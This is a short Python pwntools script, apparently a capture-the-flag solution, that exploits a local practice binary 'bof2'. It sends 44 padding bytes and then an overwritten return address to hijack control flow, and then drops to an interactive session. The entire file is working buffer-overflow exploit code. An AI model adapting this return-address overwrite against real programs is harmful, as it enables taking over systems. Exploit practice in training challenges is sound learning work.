#!/usr/bin/python
import sys
import time
import argparse
from pwn import *
context.update(arch='i386', os='linux')

def wait_for_prompt(r):
  print r.recvuntil("overflow me :")

def wait_newline_and_dump(r):
  data = r.recvuntil('\n')
  if data:
    print data.encode('hex')
    print data
  return data

#--------------------------------------------------------------------------
if __name__ == "__main__":

  parser = argparse.ArgumentParser(description='Exploit the bins.')
  parser.add_argument('--dbg'   , '-d', action="store_true")
  args = parser.parse_args()
  exe = './bof2'

  if args.dbg:
    r = gdb.debug([exe], gdbscript="""
    b *func+85
    continue
    """)
  else:
    r = process(exe)

  wait_for_prompt(r)
  payload  = 'a'*44 
  payload += p32(0x0804854f) 
  r.sendline(payload) 

  # Drop to interactive console
  r.interactive()

